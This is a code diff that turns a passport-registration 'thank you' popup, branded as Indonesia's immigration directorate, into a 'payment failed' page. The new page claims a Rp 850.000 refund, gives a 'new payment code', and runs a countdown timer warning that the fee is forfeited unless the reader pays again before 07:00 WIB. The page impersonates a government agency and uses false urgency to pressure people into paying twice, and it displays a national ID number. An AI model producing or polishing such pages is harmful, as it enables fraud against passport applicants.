@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Terima Kasih</title>
+    <title>Pembayaran Gagal</title>
     <style>
         * {
             margin: 0;
@@ -32,7 +32,7 @@
         }
         
         .header {
-            background-color: #003366;
+            background-color: #d32f2f;
             color: white;
             padding: 20px;
             text-align: center;
@@ -58,21 +58,22 @@
             padding: 25px;
         }
         
-        .success-icon {
+        .error-icon {
             text-align: center;
             margin: 20px 0;
         }
         
-        .success-icon svg {
+        .error-icon svg {
             width: 80px;
             height: 80px;
+            color: #d32f2f;
         }
         
-        .thank-you-message {
+        .error-message {
             text-align: center;
-            font-size: 22px;
+            font-size: 20px;
             font-weight: bold;
-            color: #2e7d32;
+            color: #d32f2f;
             margin: 15px 0;
         }
         
@@ -83,7 +84,7 @@
         .info-title {
             font-size: 16px;
             font-weight: bold;
-            color: #003366;
+            color: #d32f2f;
             margin-bottom: 10px;
             border-bottom: 1px solid #eaeaea;
             padding-bottom: 5px;
@@ -106,41 +107,82 @@
             color: #333;
         }
         
-        .schedule-highlight {
-            background-color: #e8f5e9;
+        .refund-info {
+            background-color: #ffebee;
             border-radius: 8px;
             padding: 15px;
-            margin: 20px 0;
+            margin-bottom: 20px;
+        }
+        
+        .refund-amount {
+            font-size: 24px;
+            font-weight: bold;
+            color: #d32f2f;
+            text-align: center;
+            margin: 10px 0;
+        }
+        
+        .payment-code {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .code-label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 5px;
             text-align: center;
         }
         
-        .schedule-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #2e7d32;
-            margin-bottom: 10px;
-        }
-        
-        .schedule-date {
+        .code-value {
             font-size: 18px;
             font-weight: bold;
-            color: #003366;
+            color: #d32f2f;
+            text-align: center;
+            margin: 10px 0;
+            letter-spacing: 1px;
+        }
+        
+        .timer-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .timer-label {
+            font-size: 14px;
+            color: #555;
             margin-bottom: 5px;
         }
         
-        .schedule-time {
-            font-size: 16px;
-            color: #e63946;
-            font-weight: 500;
+        .timer {
+            font-size: 24px;
+            font-weight: bold;
+            color: #d32f2f;
+            padding: 10px;
+            border: 2px solid #d32f2f;
+            border-radius: 5px;
+            display: inline-block;
+            min-width: 200px;
         }
         
-        .reminder-note {
+        .warning {
             background-color: #fff8e1;
             border-left: 4px solid #ffc107;
             padding: 15px;
             margin: 20px 0;
             font-size: 14px;
             color: #5d4037;
+        }
+        
+        .critical-warning {
+            background-color: #ffebee;
+            border-left: 4px solid #d32f2f;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #d32f2f;
         }
         
         .btn-container {
@@ -151,7 +193,7 @@
         }
         
         .btn {
-            background-color: #003366;
+            background-color: #d32f2f;
             color: white;
             border: none;
             padding: 12px 25px;
@@ -163,15 +205,15 @@
         }
         
         .btn:hover {
-            background-color: #002244;
+            background-color: #b71c1c;
         }
         
-        .btn-success {
-            background-color: #2e7d32;
+        .btn-secondary {
+            background-color: #757575;
         }
         
-        .btn-success:hover {
-            background-color: #1b5e20;
+        .btn-secondary:hover {
+            background-color: #616161;
         }
         
         .footer {
@@ -203,8 +245,21 @@
                 padding: 20px 15px;
             }
             
-            .thank-you-message {
+            .error-message {
+                font-size: 18px;
+            }
+            
+            .refund-amount {
                 font-size: 20px;
+            }
+            
+            .code-value {
+                font-size: 16px;
+            }
+            
+            .timer {
+                font-size: 20px;
+                min-width: 180px;
             }
             
             .btn-container {
@@ -217,22 +272,23 @@
     <div class="popup-container">
         <div class="header">
             <img src="https://z-cdn-media.chatglm.cn/files/12038e0f-115c-45aa-9d42-52d6ea82ffe6_Logo.png?auth_key=1790939066-c0ecc9049e204f12a6409fbc78ea90a8-0-f4eae3f3ae6679c5ee07784c0200fba2" alt="Logo Imigrasi" class="logo">
-            <div class="title">TERIMA KASIH</div>
-            <div class="subtitle">Pendaftaran Paspor Elektronik</div>
+            <div class="title">PEMBAYARAN GAGAL</div>
+            <div class="subtitle">Layanan Percepatan Paspor</div>
         </div>
         
         <div class="content">
-            <div class="success-icon">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="#2e7d32" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                    <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
-                    <polyline points="22 4 12 14.01 9 11.01"></polyline>
+            <div class="error-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"></circle>
+                    <line x1="12" y1="8" x2="12" y2="12"></line>
+                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
                 </svg>
             </div>
             
-            <div class="thank-you-message">Terima Kasih!</div>
+            <div class="error-message">Mohon Maaf!</div>
             
             <div style="text-align: center; margin-bottom: 20px; font-size: 16px; color: #555;">
-                Anda telah menyelesaikan proses pendaftaran. Silahkan datang tepat waktu sesuai dengan tanggal dan jam yang telah ditentukan.
+                Pembayaran layanan percepatan Anda gagal. Saldo akan dikembalikan sebesar Rp 850.000 ke dalam nomor rekening pembayaran dalam waktu 8 jam.
             </div>
             
             <div class="info-section">
@@ -245,41 +301,42 @@
                     <span class="info-label">NIK</span>
                     <span class="info-value">3204142203870002</span>
                 </div>
+            </div>
+            
+            <div class="refund-info">
+                <div class="info-title">Informasi Pengembalian Dana</div>
                 <div class="info-row">
-                    <span class="info-label">Jenis Kelamin</span>
-                    <span class="info-value">Laki-laki</span>
+                    <span class="info-label">Jumlah Pengembalian</span>
+                </div>
+                <div class="refund-amount">Rp 850.000,00</div>
+                <div class="info-row">
+                    <span class="info-label">Waktu Proses</span>
+                    <span class="info-value">Maksimal 8 jam</span>
                 </div>
             </div>
             
-            <div class="schedule-highlight">
-                <div class="schedule-title">JADWAL KEDATANGAN</div>
-                <div class="schedule-date">Selasa, 18 November 2025</div>
-                <div class="schedule-time">10:30 - 11:00 WIB</div>
+            <div class="payment-code">
+                <div class="code-label">Kode Pembayaran Baru</div>
+                <div class="code-value">910266000000850035</div>
             </div>
             
-            <div class="info-section">
-                <div class="info-title">Informasi Kantor</div>
-                <div class="info-row">
-                    <span class="info-label">Kantor Imigrasi</span>
-                    <span class="info-value">Kelas 1 TPI Bandung</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Alamat</span>
-                    <span class="info-value">Jl. Surapati</span>
-                </div>
+            <div class="timer-container">
+                <div class="timer-label">Batas Waktu Pembayaran Ulang</div>
+                <div class="timer" id="countdown">--:--:--</div>
+                <div style="font-size: 14px; color: #555; margin-top: 5px;">Sebelum pukul 07:00 WIB</div>
             </div>
             
-            <div class="reminder-note">
-                <strong>Penting:</strong> Mohon datang 15 menit sebelum jadwal yang ditentukan dan bawa semua dokumen yang diperlukan serta bukti pendaftaran ini.
+            <div class="warning">
+                <strong>Perhatian:</strong> Silahkan lakukan pembayaran ulang sebelum pukul 07:00 WIB atau permohonan Anda akan ditolak otomatis oleh sistem.
             </div>
             
-            <div style="text-align: center; margin: 20px 0; font-size: 16px; color: #2e7d32; font-weight: 500;">
-                Terima Kasih
+            <div class="critical-warning">
+                <strong>CATATAN PENTING:</strong> Uang pendaftaran hangus dan tidak ada pengembalian dana jika pembayaran ulang tidak dilakukan sebelum batas waktu yang ditentukan.
             </div>
             
             <div class="btn-container">
-                <button class="btn btn-success" onclick="window.print()">Cetak Bukti</button>
-                <button class="btn" onclick="window.close()">Tutup</button>
+                <button class="btn" onclick="window.print()">Cetak Bukti</button>
+                <button class="btn btn-secondary" onclick="window.close()">Tutup</button>
             </div>
         </div>
         
@@ -287,5 +344,85 @@
             <div class="copyright">Hak Cipta © 2023 Direktorat Jenderal Imigrasi Republik Indonesia</div>
         </div>
     </div>
+
+    <script>
+        // Fungsi untuk menghitung waktu tersisa sampai pukul 07:00 WIB
+        function getTimeUntil7AM() {
+            const now = new Date();
+            
+            // Set waktu target ke pukul 07:00 WIB hari ini
+            let target = new Date();
+            target.setHours(7, 0, 0, 0);
+            
+            // Jika waktu sekarang sudah melewati 07:00 WIB hari ini, set target ke 07:00 WIB besok
+            if (now > target) {
+                target.setDate(target.getDate() + 1);
+            }
+            
+            // Hitung selisih waktu dalam milidetik
+            const diff = target - now;
+            
+            // Konversi ke detik
+            const seconds = Math.floor(diff / 1000);
+            
+            return seconds;
+        }
+        
+        // Cek apakah ada waktu tersisa di localStorage
+        let timeLeft = localStorage.getItem('paymentRetryTimeLeft') 
+            ? parseInt(localStorage.getItem('paymentRetryTimeLeft')) 
+            : getTimeUntil7AM();
+        
+        // Update tampilan countdown
+        function updateCountdown() {
+            // Jika waktu habis
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                document.getElementById('countdown').textContent = "WAKTU HABIS";
+                document.getElementById('countdown').style.color = "#ff0000";
+                
+                // Tampilkan pemberitahuan bahwa permohonan ditolak
+                const warning = document.querySelector('.warning');
+                warning.innerHTML = "<strong>PERHATIAN:</strong> Waktu pembayaran ulang telah habis. Permohonan Anda telah ditolak oleh sistem secara otomatis.";
+                warning.style.backgroundColor = "#ffebee";
+                warning.style.borderLeftColor = "#d32f2f";
+                warning.style.color = "#d32f2f";
+                
+                // Nonaktifkan tombol cetak
+                const buttons = document.querySelectorAll('.btn');
+                buttons.forEach(button => {
+                    if (button.textContent === 'Cetak Bukti') {
+                        button.disabled = true;
+                        button.style.backgroundColor = "#cccccc";
+                        button.style.cursor = "not-allowed";
+                    }
+                });
+                
+                return;
+            }
+            
+            const hours = Math.floor(timeLeft / 3600);
+            const minutes = Math.floor((timeLeft % 3600) / 60);
+            const seconds = timeLeft % 60;
+            
+            // Format tampilan waktu
+            const formattedTime = 
+                String(hours).padStart(2, '0') + ':' + 
+                String(minutes).padStart(2, '0') + ':' + 
+                String(seconds).padStart(2, '0');
+            
+            document.getElementById('countdown').textContent = formattedTime;
+            
+            // Simpan waktu tersisa ke localStorage
+            localStorage.setItem('paymentRetryTimeLeft', timeLeft);
+            
+            // Kurangi waktu
+            timeLeft--;
+        }
+        
+        // Jalankan countdown setiap detik
+        updateCountdown();
+        const timerInterval = setInterval(updateCountdown, 1000);
+    </script>
 </body>
 </html>
